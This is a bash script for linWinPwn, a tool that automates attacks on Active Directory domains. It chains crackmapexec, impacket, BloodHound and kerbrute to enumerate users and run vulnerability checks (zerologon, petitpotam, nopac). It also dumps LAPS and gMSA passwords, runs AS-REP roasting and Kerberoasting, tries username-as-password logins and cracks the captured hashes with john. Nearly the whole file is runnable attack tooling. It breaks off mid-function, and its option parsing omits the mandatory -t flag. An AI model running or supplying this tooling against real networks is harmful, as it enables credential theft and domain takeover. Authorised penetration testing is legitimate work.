#!/bin/bash
#
#      _        __        ___       ____                 
#     | |(_)_ __\ \      / (_)_ __ |  _ \__      ___ __  
#     | || | '_ \\ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
#     | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | |
#     |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
#
# linWinPwn - version 0.1.1 (https://github.com/lefayjey/linWinPwn)
# Author: lefayjey
# Inspired by: S3cur3Th1sSh1t's WinPwn (https://github.com/S3cur3Th1sSh1t/WinPwn)
#


#Colors
RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
BLUE='\033[1;34m'
YELLOW='\033[1;33m'
PURPLE='\033[1;35m'
NC='\033[0m'

#Default variables
user=""
password=""
modules="ad_enum,kerberos"
output_dir="."
pass_list="/usr/share/wordlists/rockyou.txt"
users_list="/usr/share/seclists/Usernames/cirt-default-usernames.txt"
opsec_bool=false

#Tools variables
python=$(which python3)
impacket_dir="/usr/local/bin"
bloodhound=$(which bloodhound-python)
ldapdomaindump=$(which ldapdomaindump)
crackmapexec=$(which crackmapexec)
john=$(which john)
smbmap=$(which smbmap)
nmap=$(which nmap)
kerbrute=$(which kerbrute)
adidnsdump=$(which adidnsdump)
certipy=$(which certi.py)
scripts_dir="."

print_banner () {
    echo -e "
       _        __        ___       ____                  
      | |(_)_ __\ \      / (_)_ __ |  _ \__      ___ __   
      | || | '_  \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \  
      | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
      |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 

      ${BLUE}linWinPwn: ${CYAN} version 0.1.1
      ${NC}https://github.com/lefayjey/linWinPwn
      ${BLUE}Author: ${CYAN}lefayjey
${NC}
      ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn
      ${NC}https://github.com/S3cur3Th1sSh1t/WinPwn
"
}

help_linWinPwn () {
    print_banner
    echo -e "${YELLOW}Parameters${NC}"
    echo -e "-h     Show the help message"
    echo -e "-t     DC IP or target Domain ${RED}[MANDATORY]${NC}"
    echo -e "-u     Username (default: Guest)"
    echo -e "-p     Password or LM:NT Hash or location to Kerberos ticket './krb5cc_ticket' (default: empty)" 
    echo -e "-M     Comma separated modules to run (default: ad_enum,kerberos)"
    echo -e "       ${CYAN}Modules available:${NC} ad_enum, kerberos, scan_servers, pwd_dump, user, all"
    echo -e "-o     Output directory (default: current dir)"
    echo -e ""
    echo -e "${YELLOW}Additional parameters${NC}"
    echo -e "-O     Run only OPSec Safe checks (authenticated mode)"
    echo -e "-U     Custom username list used during anonymous checks"
    echo -e "-P     Custom password list used during password cracking"
    echo -e "-S     Custom servers list used during password dumping"
    echo -e ""
    echo -e "${YELLOW}Example usages${NC}"
    echo -e "./$(basename "$0") -t dc_ip_or_target_domain ${CYAN}(No password for anonymous login)${NC}" >&2;
    echo -e "./$(basename "$0") -d domain -u user -p password_or_hash_or_kerbticket -t dc_ip_or_target_domain" >&2;
    echo -e ""
}

while getopts ":d:u:p:O:M:o:U:P:S:Lh" opt; do
  case $opt in
    d) domain="${OPTARG}";;
    u) user="${OPTARG}";; #leave empty for anonymous login
    p) password="${OPTARG}";; #password or NTLM hash or location of krb5cc ticket
    t) dc_ip="${OPTARG}";; #mandatory
    M) modules="${OPTARG}";; #comma separated modules to run
    o) output_dir="${OPTARG}";;
    O) opsec_bool=true;;
    U) users_list="${OPTARG}";;
    P) pass_list="${OPTARG}";;
    S) servers_list="${OPTARG}";;
    h) help_linWinPwn; exit;;
    \?) echo -e "Unknown option: -${OPTARG}" >&2; exit 1;;
  esac
done

prepare (){
    if [ -z "$dc_ip" ] ; then
        echo -e "${RED}[-] Missing target... ${NC}"
        echo -e "Use -h for help"
        exit 1
    fi

    if [ ! -f "${crackmapexec}" ] ; then
        echo -e "${RED}[-] Please run setup.sh and try again... ${NC}"
        exit 1
    else
        dc_info=$(${crackmapexec} smb ${dc_ip})
    fi

    dc_NETBIOS=$(echo $dc_info| cut -d ":" -f 2 | sed "s/) (domain//g" | head -n 1)
    dc_domain=$(echo $dc_info | cut -d ":" -f 3 | sed "s/) (signing//g"| head -n 1)
    dc_FQDN=${dc_NETBIOS}"."${dc_domain}
    kdc=""

    if [ -z "$dc_domain" ] ; then
        echo -e "${RED}[-] Please ensure the target is a Domain Controller and try again... ${NC}"
        exit 1
    elif [ -z "$domain" ] ; then
        domain=${dc_domain}
    fi

    nullsess_bool=false
    hash_bool=false
    kerb_bool=false

    output_dir="${output_dir}/linWinPwn_$(date +%Y%m%d%H%M%S)"

    servers_ip_list="${output_dir}/DomainRecon/ip_list_${dc_domain}.txt"
    dc_ip_list="${output_dir}/DomainRecon/ip_list_dc_${dc_domain}.txt"
    sql_ip_list="${output_dir}/DomainRecon/ip_list_sql_${dc_domain}.txt"
    dc_hostname_list="${output_dir}/DomainRecon/server_list_dc_${dc_domain}.txt"
    sql_hostname_list="${output_dir}/DomainRecon/server_list_sql_${dc_domain}.txt"
    dns_records="${output_dir}/DomainRecon/dns_records_${dc_domain}.csv"

    #Check if null session is used
    if [ "${user}" == "" ]  && [ "${password}" == "" ]; then
        nullsess_bool=true
        argument_cme=""
        argument_smbmap=""
        target=${dc_ip}
        target_dc=${dc_ip_list}
        echo -e "${YELLOW}[i]${NC} Authentication method: null session ${NC}"
        echo -e "${YELLOW}[i]${NC} Target domain: ${dc_domain} ${NC}"
    #Check if empty password is used
    elif [ "${password}" == "" ]; then
        argument_cme="-d ${domain} -u ${user} -p ''"
        argument_smbmap="-d ${domain} -u ${user} -p ''"
        argument_imp="${domain}/${user}:''"
        target=${dc_ip}
        target_dc=${dc_ip_list}
        echo -e "${YELLOW}[i]${NC} Authentication method: ${user} with empty password ${NC}"
        echo -e "${YELLOW}[i]${NC} Target domain: ${dc_domain} ${NC}"
    #Check if NTLM hash is used, and complete with empty LM hash
    elif ([ "${#password}" -eq 65 ] && [ "$(expr substr $password 33 1)" == ":" ]) || ([ "${#password}" -eq 33 ] && [ "$(expr substr $password 1 1)" == ":" ]) ; then
        hash_bool=true
        if [ "$(echo $password | cut -d ":" -f 1)" == "" ]; then
            password="aad3b435b51404eeaad3b435b51404ee"$password
        fi
        argument_cme="-d ${domain} -u ${user} -H ${password}"
        argument_ldapdns="-u ${domain}\\${user} -p ${password}"
        argument_smbmap="-d ${domain} -u ${user} -p ${password}"
        argument_imp="${domain}/${user} -hashes ${password}"
        argument_bhd="-u ${user}@${domain} --hashes ${password}"
        argument_gMSA="-d ${domain} -u ${user} -p ${password}"
        argument_LRS="-u ${user} -nthash $(echo ${password} | cut -d ':' -f 2)"
        target=${dc_ip}
        target_dc=${dc_ip_list}
        echo -e "${YELLOW}[i]${NC} Authentication method: NTLM hash of ${user}"
        echo -e "${YELLOW}[i]${NC} Target domain: ${dc_domain}"
    #Check if kerberos ticket is used
    elif [ -f "${password}" ] ; then
        kerb_bool=true
        export KRB5CCNAME=$(realpath $password)
        argument_cme="-d ${domain} -u ${user} -k"
        argument_imp="${domain}/${user} -k -no-pass"
        argument_bhd="-u ${user}@${domain} -k"
        argument_gMSA="-d ${domain} -u ${user} -k"
        target=${dc_domain}
        target_dc=${dc_hostname_list}
        kdc="$(echo $dc_FQDN | cut -d '.' -f 1)."
        echo -e "${YELLOW}[i]${NC} Authentication method: Kerberos Ticket of $user located at $(realpath $password)"
        echo -e "${YELLOW}[i]${NC} Target domain: ${dc_domain}"
    else
        argument_cme="-d ${domain} -u ${user} -p ${password}"
        argument_ldapdns="-u ${domain}\\${user} -p ${password}"
        argument_smbmap="-d ${domain} -u ${user} -p ${password}"
        argument_imp="${domain}/${user}:${password}"
        argument_bhd="-u ${user}@${domain} -p ${password}"
        argument_gMSA="-d ${domain} -u ${user} -p ${password}"
        argument_LRS="-u ${user} -p ${password}"
        target=${dc_ip}
        target_dc=${dc_ip_list}
        echo -e "${YELLOW}[i]${NC} Authentication: password of ${user}"
        echo -e "${YELLOW}[i]${NC} Target domain: ${dc_domain}"
    fi

    echo -e "${YELLOW}[i]${NC} Domain Controller's FQDN: ${dc_FQDN}"
    echo -e "${YELLOW}[i]${NC} Running modules: ${modules}"
    echo -e ""
}

dns_enum () {
    mkdir -p ${output_dir}/DomainRecon
    echo -e "${BLUE}[*] DNS dump using adidnsdump${NC}"

    if [ ! -f "${adidnsdump}" ] ; then
        echo -e "${RED}[-] Please verify the installation of adidnsdump${NC}"
        echo -e ""
    elif [ ! -f "${dns_records}" ]; then
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] adidnsdump requires credentials${NC}"
            echo ${dc_ip} >> ${servers_ip_list}
            echo ${dc_FQDN} >> ${dc_hostname_list}
        elif [ "${kerb_bool}" == true ] ; then
            echo -e "${PURPLE}[-] adidnsdump does not support kerberos tickets${NC}"
            echo ${dc_ip} >> ${servers_ip_list}
            echo ${dc_FQDN} >> ${dc_hostname_list}
        else
            ${adidnsdump} ${argument_ldapdns} --dns-tcp ${dc_ip}
            mv records.csv ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null
            /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 >> ${servers_ip_list}
            /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "@" | grep "A," | cut -d "," -f 3 >> ${dc_ip_list}
            /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep -i "db\|sql" | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 >> ${sql_ip_list}
            /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "@" | grep "NS," | cut -d "," -f 3 >> ${dc_hostname_list}
            /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep -i "db\|sql" | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 2 >> ${sql_hostname_list}
        fi
    else
        echo -e "${YELLOW}[i] DNS dump found ${NC}"
    fi

    echo -e ""
}

main () {
    print_banner

    echo -e "${GREEN}[+] $(date)${NC}"
    echo -e ""

    prepare
    dns_enum

    for i in $(echo $modules | sed "s/,/ /g"); do
        case $i in
            ad_enum)
            echo -e "${GREEN}[+] Module Started: Active Directory Enumeration${NC}"
            echo -e "${GREEN}------------------------------------------------${NC}"
            echo -e ""
            ad_enum
            echo -e ""
            ;;

            kerberos)
            echo -e "${GREEN}[+] Module Started: Kerberos-based Attacks${NC}"
            echo -e "${GREEN}------------------------------------------${NC}"
            echo -e ""
            kerberos
            echo -e ""
            ;;

            scan_servers)
            echo -e "${GREEN}[+] Module Started: SMB Shares and RPC Scan${NC}"
            echo -e "${GREEN}-------------------------------------------${NC}"
            echo -e ""
            scan_servers
            ;;

            pwd_dump)
            echo -e "${GREEN}[+] Module Started: Password Dump${NC}"
            echo -e "${GREEN}---------------------------------${NC}"
            echo -e ""
            pwd_dump
            ;;

            all)
            echo -e "${GREEN}[+] Module Started: Active Directory Enumeration${NC}"
            echo -e "${GREEN}------------------------------------------------${NC}"
            echo -e ""
            ad_enum
            echo -e "${GREEN}[+] Module Started: Kerberos-based Attacks${NC}"
            echo -e "${GREEN}------------------------------------------${NC}"
            echo -e ""
            kerberos
            echo -e "${GREEN}[+] Module Started: SMB Shares and RPC Scan${NC}"
            echo -e "${GREEN}-------------------------------------------${NC}"
            echo -e ""
            scan_servers
            echo -e "${GREEN}[+] Module Started: Password Dump${NC}"
            echo -e "${GREEN}---------------------------------${NC}"
            echo -e ""
            pwd_dump
            ;;

            user)
            echo -e "${GREEN}[+] Module Started: Active Directory Enumeration${NC}"
            echo -e "${GREEN}------------------------------------------------${NC}"
            echo -e ""
            ad_enum
            echo -e "${GREEN}[+] Module Started: Kerberos-based Attacks${NC}"
            echo -e "${GREEN}------------------------------------------${NC}"
            echo -e ""
            kerberos
            echo -e "${GREEN}[+] Module Started: SMB Shares and RPC Scan${NC}"
            echo -e "${GREEN}-------------------------------------------${NC}"
            echo -e ""
            scan_servers
            ;;

            *)
            echo -e "${RED}[-] Unknown module $i... ${NC}"
            echo -e ""
            ;;
        esac
    done
    
    echo -e ""
    echo -e "${GREEN}[+] All modules have completed. Output folder is: $(realpath $output_dir)${NC}"
    echo -e "${GREEN}------------------------------------------------${NC}"
}

ad_enum () {
    mkdir -p ${output_dir}/DomainRecon/BloodHound
    mkdir -p ${output_dir}/DomainRecon/LDAPDump

    echo -e "${BLUE}[*] BloodHound enum${NC}"
    if [ ! -f "${bloodhound}" ] ; then
        echo -e "${RED}[-] Please verify the installation of bloodhound${NC}"
    else
        current_dir=$(pwd)
        mkdir -p ${output_dir}/DomainRecon/BloodHound/${dc_domain}
        cd ${output_dir}/DomainRecon/BloodHound/${dc_domain}
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] BloodHound requires credentials${NC}"
        elif [ "${opsec_bool}" == true ] ; then
            ${bloodhound} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dc_ip} --dns-timeout 5 --dns-tcp
        else
            ${bloodhound} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 5 --dns-tcp
        fi
        cd ${current_dir}
        
    fi
    echo -e ""

    echo -e "${BLUE}[*] ldapdomain enum${NC}"
    if [ ! -f "${ldapdomaindump}" ] ; then
        echo -e "${RED}[-] Please verify the installation of ldapdomaindump${NC}"
    else
        mkdir -p ${output_dir}/DomainRecon/LDAPDump/${dc_domain}
        if [ "${nullsess_bool}" == true ] ; then
            ${ldapdomaindump} ldap://${dc_ip} --no-json -o ${output_dir}/DomainRecon/LDAPDump/${dc_domain} 2>/dev/null
        elif [ "${kerb_bool}" == true ] ; then
                echo -e "${PURPLE}[-] ldapdomain does not support kerberos tickets${NC}"
        else
            ${ldapdomaindump} ${argument_ldapdns} ldap://${dc_ip} --no-json -o ${output_dir}/DomainRecon/LDAPDump/${dc_domain} 2>/dev/null
        fi

        #Parsing user and computer lists
        /bin/cat ${output_dir}/DomainRecon/LDAPDump/${dc_domain}/domain_users.grep 2>/dev/null | awk -F '\t' '{ print $3 }'| grep -v "sAMAccountName" | sort -u > ${output_dir}/DomainRecon/users_list_ldap_${dc_domain}.txt 2>&1
        /bin/cat ${output_dir}/DomainRecon/LDAPDump/${dc_domain}/domain_computers.grep 2>/dev/null | awk -F '\t' '{ print $3 }' | grep -v "dNSHostName" | sort -u > ${output_dir}/DomainRecon/servers_list_${dc_domain}.txt 2>&1
        echo ${dc_FQDN} >> ${output_dir}/DomainRecon/servers_list_${dc_domain}.txt 2>&1
    fi
    echo -e ""

    echo -e "${BLUE}[*] crackmapexec enum${NC}"
    if [ ! -f "${crackmapexec}" ] ; then
        echo -e "${RED}[-] Please verify the installation of crackmapexec${NC}"
    else
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${CYAN}[*] rid brute ${NC}"
            ${crackmapexec} smb ${target} ${argument_cme} --rid-brute 2>/dev/null > ${output_dir}/DomainRecon/cme_rid_brute_${dc_domain}.txt
            /bin/cat ${output_dir}/DomainRecon/rid_brute_${dc_domain}.txt 2>/dev/null | grep "SidTypeUser" | cut -d ":" -f 2 | cut -d "\\" -f 2 | sed "s/ (SidTypeUser)\x1B\[0m//g" > ${output_dir}/DomainRecon/users_list_ridbrute_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[*] users enum ${NC}"
            ${crackmapexec} smb ${target} ${argument_cme} --users > ${output_dir}/DomainRecon/users_nullsess_${dc_domain}.txt
            /bin/cat ${output_dir}/DomainRecon/users_nullsess_${dc_domain}.txt 2>/dev/null | grep "${dc_domain}" | grep -v ":" | cut -d "\\" -f 2 | cut -d " " -f 1 > ${output_dir}/DomainRecon/users_list_nullsess_${dc_domain}.txt 2>&1
        fi         
        echo -e "${CYAN}[*] spooler check ${NC}"
        ${crackmapexec} smb ${target_dc} ${argument_cme} -M spooler 2>/dev/null | tee ${output_dir}/DomainRecon/cme_spooler_output_${dc_domain}.txt 2>&1
        echo -e "${CYAN}[*] webdav check ${NC}"
        ${crackmapexec} smb ${target_dc} ${argument_cme} -M webdav 2>/dev/null | tee ${output_dir}/DomainRecon/cme_webdav_output_${dc_domain}.txt 2>&1
        echo -e "${CYAN}[*] nopac check ${NC}"
        ${crackmapexec} smb ${target_dc} ${argument_cme} -M nopac 2>/dev/null | tee ${output_dir}/DomainRecon/cme_nopac_output_${dc_domain}.txt 2>&1
        echo -e "${CYAN}[*] petitpotam check ${NC}"
        for i in $(/bin/cat ${target_dc}); do
            ${crackmapexec} smb ${i} ${argument_cme} -M petitpotam 2>/dev/null | tee -a ${output_dir}/DomainRecon/cme_petitpotam_output_${dc_domain}.txt 2>&1
        done
        echo -e "${CYAN}[*] Password Policy enum ${NC}"
        ${crackmapexec} smb ${target} ${argument_cme} --pass-pol 2>/dev/null | tee ${output_dir}/DomainRecon/cme_passpol_output_${dc_domain}.txt 2>&1
        echo -e "${CYAN}[*] GPP checks ${NC}"
        ${crackmapexec} smb ${target_dc} ${argument_cme} -M gpp_autologin 2>/dev/null | tee ${output_dir}/DomainRecon/cme_gpp_output_${dc_domain}.txt 2>&1
        ${crackmapexec} smb ${target_dc} ${argument_cme} -M gpp_password 2>/dev/null | tee -a ${output_dir}/DomainRecon/cme_gpp_output_${dc_domain}.txt 2>&1
        if [ "${opsec_bool}" == false ] ; then
            echo -e "${CYAN}[*] zerologon check. This may take a while... ${NC}"
            ${crackmapexec} smb ${target} ${argument_cme} -M zerologon 2>/dev/null | tee ${output_dir}/DomainRecon/cme_zerologon_output_${dc_domain}.txt 2>&1
        fi
        echo -e "${CYAN}[*] Password not required enum ${NC}"
        ${crackmapexec} ldap ${target_dc} ${argument_cme} --password-not-required --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_passnotrequired_output_${dc_domain}.txt 2>&1
        echo -e "${CYAN}[*] laps dump ${NC}"
        ${crackmapexec} ldap ${target} ${argument_cme} -M laps --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_laps_output_${dc_domain}.txt 2>&1
        echo -e "${CYAN}[*] adcs check ${NC}"
        ${crackmapexec} ldap ${target} ${argument_cme} -M adcs --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_adcs_output_${dc_domain}.txt 2>&1
        echo -e "${CYAN}[*] users description dump ${NC}"
        ${crackmapexec} ldap ${target} ${argument_cme} -M get-desc-users --kdcHost "${kdc}${dc_domain}" 2>/dev/null | grep -i "pass" | tee ${output_dir}/DomainRecon/cme_get-desc-users_pass_output_${dc_domain}.txt 2>&1
        echo -e "${CYAN}[*] get MachineAccountQuota ${NC}"
        ${crackmapexec} ldap ${target} ${argument_cme} -M MAQ --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_MachineAccountQuota_output_${dc_domain}.txt 2>&1
        echo -e "${CYAN}[*] ldap-signing check ${NC}"
        ${crackmapexec} ldap ${target_dc} ${argument_cme} -M ldap-signing --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_ldap-signing_output_${dc_domain}.txt 2>&1
        echo -e "${CYAN}[*] Trusted-for-delegation check ${NC}"
        ${crackmapexec} ldap ${target_dc} ${argument_cme} --trusted-for-delegation --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_trusted-for-delegation_output_${dc_domain}.txt 2>&1
        echo -e "${CYAN}[*] mssql_priv check ${NC}"
        ${crackmapexec} mssql ${sql_ip_list} ${argument_cme} -M mssql_priv 2>/dev/null | tee ${output_dir}/DomainRecon/cme_mssql_priv_output_${dc_domain}.txt 2>&1
    fi
    echo -e ""

    echo -e "${BLUE}[*] impacket enum${NC}"
    if [ ! -f "${impacket_dir}/findDelegation.py" ] ; then
        echo -e "${RED}[-] Please verify the installation of impacket${NC}"
    else
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] impacket requires credentials${NC}"
        else
            ${python} ${impacket_dir}/findDelegation.py ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain} | tee ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt
            if grep -q 'error' ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt; then
                echo -e "${RED}[-] Errors during Delegation enum... ${NC}"
            fi
        fi
    fi
    echo -e ""

    echo -e "${BLUE}[*] gMSA Dump${NC}"
    if [ ! -f "${scripts_dir}/gMSADumper.py" ] ; then
        echo -e "${RED}[-] Please verify the location of gMSADumper.py${NC}"
    else
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] gMSA Dump requires credentials${NC}"
        else
            ${python} ${scripts_dir}/gMSADumper.py -d ${argument_gMSA} -l ${dc_ip} 2>/dev/null > ${output_dir}/DomainRecon/gMSA_dump_${dc_domain}.txt
        fi
    fi
    echo -e ""

    echo -e "${BLUE}[*] LdapRelayScan checks${NC}"
    if [ ! -f "${scripts_dir}/LdapRelayScan.py" ] ; then
        echo -e "${RED}[-] Please verify the location of LdapRelayScan.py${NC}"
    else
        if [ "${nullsess_bool}" == true ] ; then
            ${python} ${scripts_dir}/LdapRelayScan.py -method LDAPS -dc-ip ${dc_ip} 2>/dev/null > ${output_dir}/DomainRecon/LdapRelayScan_${dc_domain}.txt
        elif [ "${kerb_bool}" == true ] ; then
            echo -e "${PURPLE}[-] LdapRelayScan does not support kerberos tickets${NC}"
        else
            ${python} ${scripts_dir}/LdapRelayScan.py -method BOTH -dc-ip ${dc_ip} ${argument_LRS} 2>/dev/null > ${output_dir}/DomainRecon/LdapRelayScan_${dc_domain}.txt
        fi
    fi
    echo -e ""

    echo -e "${BLUE}[*] certipy enum${NC}"
    if [[ ! -f "${certipy}" ]] && [[ ! -f "${impacket_dir}/getTGT.py)" ]] ; then
        echo -e "${RED}[-] Please verify the installation of certipy${NC}"
    elif [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] certipy requires credentials${NC}"
    else
        if  [ "${kerb_bool}" == false ] ; then
            current_dir=$(pwd)
            cd ${output_dir}
            ${python} ${impacket_dir}/getTGT.py ${argument_imp} -dc-ip ${dc_ip}
            cd ${current_dir}
            export KRB5CCNAME="${output_dir}/${user}.ccache"
        fi
        ${certipy} list ${domain}/${user} -k -n --dc-ip ${dc_ip} --class ca 2>/dev/null | tee ${output_dir}/DomainRecon/certipy_CA_output_${dc_domain}.txt
        ${certipy} list ${domain}/${user} -k -n --dc-ip ${dc_ip} --class service 2>/dev/null | tee ${output_dir}/DomainRecon/certipy_CAServices_output_${dc_domain}.txt
        ${certipy} list ${domain}/${user} -k -n --dc-ip ${dc_ip} --vuln --enable 2>/dev/null | tee ${output_dir}/DomainRecon/certipy_vulntemplates_output_${dc_domain}.txt
    fi
    echo -e ""
}

kerberos () {
    mkdir -p ${output_dir}/Kerberos
    known_users_list="${output_dir}/DomainRecon/users_list_sorted_${dc_domain}.txt"
    /bin/cat ${output_dir}/DomainRecon/users_list_*_${dc_domain}.txt 2>/dev/null | sort -uf > ${known_users_list} 2>&1

    echo -e "${BLUE}[*] kerbrute enumeration${NC}"
    if [ ! -f "${kerbrute}" ] ; then
        echo -e "${RED}[-] Please verify the installation of kerbrute${NC}"
    else
        if [ ! -s "${known_users_list}" ] ; then
            echo -e "${YELLOW}[i] Using $users_list wordlist for user enumeration. This may take a while...${NC}"
            ${kerbrute} -users ${users_list} -domain ${dc_domain} -dc-ip ${dc_ip} -no-save-ticket -threads 5 -outputusers ${output_dir}/DomainRecon/users_list_kerbrute_${dc_domain}.txt > ${output_dir}/Kerberos/kerbrute_user_output_${dc_domain}.txt 2>&1
            if [ -s "${output_dir}/DomainRecon/users_list_kerbrute_${dc_domain}.txt" ] ; then
                echo -e "${GREEN}[+] Printing valid accounts...${NC}"
                /bin/cat ${output_dir}/DomainRecon/users_list_kerbrute_${dc_domain}.txt 2>/dev/null
            fi
            
        elif [ "${opsec_bool}" == false ] ; then
            echo -e "${YELLOW}[i] Password = username check using kerbrute. This may take a while...${NC}"
            for i in $(/bin/cat ${known_users_list}); do
                ${kerbrute} -user ${i} -password ${i} -domain ${dc_domain} -dc-ip ${dc_ip} -no-save-ticket -threads 5 -outputfile ${output_dir}/DomainRecon/user_eq_pass_valid_${dc_domain}.txt | grep -v "Impacket" >> ${output_dir}/Kerberos/kerbrute_pass_output_${dc_domain}.txt 2>&1
            done
            if [ -s "${output_dir}/DomainRecon/user_eq_pass_valid_${dc_domain}.txt" ] ; then
                echo -e "${GREEN}[+] Printing accounts with username=password...${NC}"
                /bin/cat ${output_dir}/DomainRecon/user_eq_pass_valid_${dc_domain}.txt 2>/dev/null | grep -v "Impacket" 2>/dev/null
            else
                echo -e "${PURPLE}[-] No accounts with username=password found${NC}"
            fi
        fi
    fi
    echo -e ""

    /bin/cat ${output_dir}/DomainRecon/users_list_*_${dc_domain}.txt 2>/dev/null | sort -uf > ${known_users_list} 2>&1

    echo -e "${BLUE}[*] AS REP Roasting Attack${NC}"
    if [ ! -f "${impacket_dir}/GetNPUsers.py" ] ; then
        echo -e "${RED}[-] Please verify the installation of impacket${NC}"
    elif [[ "${dc_domain}" != "${domain}" ]] || [ "${nullsess_bool}" == true ] ; then
        if [ -s "${known_users_list}" ] ; then
            users_list=${known_users_list}
        fi
        ${python} ${impacket_dir}/GetNPUsers.py ${dc_domain}/ -usersfile ${users_list} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt 2>&1
        /bin/cat ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt | grep krb5asrep | sed 's/\$krb5asrep\$23\$//' > ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>&1
    fi 

    if [ ! -f "${crackmapexec}" ] ; then
        echo -e "${RED}[-] Please verify the installation of crackmapexec${NC}"
    else
        if [ "${nullsess_bool}" == false ] ; then
            ${crackmapexec} ldap ${target} ${argument_cme} --asreproast ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt --kdcHost "${kdc}${dc_domain}" | tee ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt
            echo -e "${BLUE}[*] Kerberoast Attack${NC}"
            ${crackmapexec} ldap ${target} ${argument_cme} --kerberoast ${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt --kdcHost "${kdc}${dc_domain}" | tee ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt
        fi
    fi
    
    echo -e "${BLUE}[*] Cracking hashes using john the ripper${NC}"
    if [ ! -f "${john}" ] ; then
        echo -e "${RED}[-] Please verify the installation of john${NC}"
    else
        echo -e "${CYAN}[*] Launching john on collected kerberoast hashes. This may take a while...${NC}"

        if [ ! -s ${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt ]; then
            echo -e "${PURPLE}[-] No SPN accounts found${NC}"
        else
            echo -e "${YELLOW}[i] Press CTRL-C to abort john...${NC}"
            $john ${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt --format=krb5tgs --wordlist=$pass_list
            echo -e "${GREEN}[+] Printing cracked Kerberoast hashes...${NC}"
            $john ${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt --format=krb5tgs --show | tee ${output_dir}/Kerberos/kerberoast_john_results_${dc_domain}.txt
        fi

        echo -e "${CYAN}[*] Launching john on collected asreproast hashes. This may take a while...${NC}"

        if [ ! -s ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt ]; then
            echo -e "${PURPLE}[-] No accounts with Kerberos preauth disabled found${NC}"
        else
            echo -e "${YELLOW}[i] Press CTRL-C to abort john...${NC}"
            $john ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt --format=krb5asrep --wordlist=$pass_list
            echo -e "${GREEN}[+] Printing cracked AS REP Roast hashes...${NC}"
            $john ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt --format=krb5asrep --show | tee ${output_dir}/Kerberos/asreproast_john_results_${dc_domain}.txt
        fi
    fi
    echo -e ""
}

scan_servers () {
    mkdir -p ${output_dir}/Scans/SMBDump
    echo -e "${BLUE}[*] nmap scan on port 445 ${NC}"
    if [ ! -f "${nmap}" ]; then
        echo -e "${RED}[-] Please verify the installation of nmap ${NC}"
    else
        servers_smb_list="${output_dir}/Scans/servers_list_smb_${dc_domain}.txt"
        if [ ! -f "${servers_smb_list}" ]; then
            ${nmap} -p 445 -Pn -sT -n -iL ${servers_ip_list} -oG ${output_dir}/Scans/nmap_smb_scan_${dc_domain}.txt 1>/dev/null 2>&1
            grep -a "open" ${output_dir}/Scans/nmap_smb_scan_${dc_domain}.txt | cut -d " " -f 2 > ${servers_smb_list}
        else
            echo -e "${YELLOW}[i] SMB nmap scan results found ${NC}"
        fi
    fi
    echo -e ""

    echo -e "${BLUE}[*] crackmapexec enum${NC}"
    if [ ! -f "${crackmapexec}" ] ; then
        echo -e "${RED}[-] Please verify the installation of crackmapexec${NC}"
    else
        echo -e "${CYAN}[*] spooler check ${NC}"
        ${crackmapexec} smb ${servers_smb_list} ${argument_cme} -M spooler 2>/dev/null > ${output_dir}/Scans/cme_spooler_scan_output_${dc_domain}.txt 2>&1
        echo -e "${CYAN}[*] webdav check ${NC}"
        ${crackmapexec} smb ${servers_smb_list} ${argument_cme} -M webdav 2>/dev/null > ${output_dir}/Scans/cme_webdav_scan_output_${dc_domain}.txt 2>&1
    fi
    echo -e ""

